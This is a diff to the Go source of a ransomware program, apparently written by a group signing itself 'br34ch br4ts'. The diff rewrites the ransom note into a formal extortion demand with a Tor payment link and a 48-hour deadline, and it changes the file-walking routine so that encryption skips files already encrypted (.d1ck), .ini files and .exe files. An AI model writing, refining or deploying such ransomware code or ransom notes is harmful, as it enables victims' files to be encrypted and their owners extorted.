@@ -16,31 +16,21 @@ import (
 
 func create_ransom_letter(ransom_letter_path string, op_sys string) {
 	// ransom letter content
-	content := `Listen up, you pathetic excuse for a human. I know you're panicking right now, but trust me, you haven't seen anything yet.
-You thought your precious files were safe and secure? Maybe in your dreams, sucker. Every. Single. File. Gone.
-Now you have 24 hours to pay up. If not, you'll never regain access to your data ever.
-Consider it vanished into thin air, forever beyond your reach.
+	content := `ATTENTION! YOUR FILES HAVE BEEN ENCRYPTED
+Your documents, photos, videos, and other important files have been encrypted.  
+You cannot access your files without a unique decryption key.
 
-Don't even think about contacting authorities. 
-We're watching you. And trust me, you don't want that kind of attention.
+HOW TO RECOVER YOUR FILES:
+1. DO NOT attempt to rename the files or use third-party decryption software. This may result in permanent data loss.
+2. Download TOR browser from: https://www.torproject.org/download/
+3. Open this link: https://br34ch-br4ts.netlify.app/ (PUT A REAL ONION WEBSITE HERE) from the TOR browser. 
+4. Follow the instructions.
 
-Download TOR browser from:
-Open this link: https://br34ch-br4ts.netlify.app/ from the TOR browser. 
-Follow the instructions.
-
-You have one shot. Make it count.
-Failure to pay up and every trace of your data will be locked away forever. Completely inaccessible. 
-Consider this your only warning.
-Pay up or suffer the consequences.
-
-One more thing, you overprivileged shithead: I'm not bluffing.
-You wouldn't want to find out the hard way, right?
-The choice is yours.
-
-Remember, your time is running out... Suckers.
+WHAT HAPPENS IF YOU DONT PAY:
+If we do not receive the payment within 48 Hours, the decryption key will be permanently deleted, and your files will be lost forever.
 
 
-Br34ch br4ts`
+br34ch br4ts :)`
 
 	if op_sys == "windows" {
 		ransom_letter_path = ransom_letter_path + "\\READ THIS, IDIOT.txt"
@@ -128,8 +118,13 @@ func explore_directory(parent_dir string) {
 			// other directories
 			// fmt.Println("Exploring directory:", file_path)
 		} else { // it's a file
-			//if strings.HasSuffix(file_path, ".d1ck") { } // already encrypted (in case the code is executed 2 or more times)
+			if strings.HasSuffix(file_path, ".d1ck") { // already encrypted (in case the ransomware is executed 2 or more times)
+				return nil
+			}
 			if strings.HasSuffix(file_path, ".ini") { // if .ini don't do anything
+				return nil
+			}
+			if strings.HasSuffix(file_path, ".exe") { // if .exe don't do anything
 				return nil
 			}
 			encrypt_file(file_path)
